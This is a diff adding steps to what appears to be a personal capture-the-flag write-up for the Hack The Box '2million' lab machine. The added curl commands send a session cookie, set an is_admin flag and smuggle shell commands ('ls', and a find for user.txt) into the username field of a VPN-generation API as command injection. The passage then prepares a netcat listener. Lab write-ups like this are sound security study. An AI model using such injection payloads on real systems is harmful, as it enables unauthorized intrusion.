@@ -168,3 +168,21 @@ curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.ht
 - Our VPN cert has been generated!
 ![[Pasted image 20230903232814.png]]
 
+- Because these parameter values are being validated, there's a chance for command injection. 
+- Append ;ls; to the end of the username and see what we get
+``` bash
+curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":1, "username":"user;ls;"}'
+```
+
+- It listed several files!
+![[Pasted image 20230903233921.png]]
+
+- Find the user flag
+``` bash
+curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":1, "username":"user;find / -type f -name user.txt;"}'
+```
+
+![[Pasted image 20230903234247.png]]
+
+- Using the find command, we've found the user.txt flag, however, when I tried cat'ing the file, nothing worked. 
+- Initiate your netcat listener
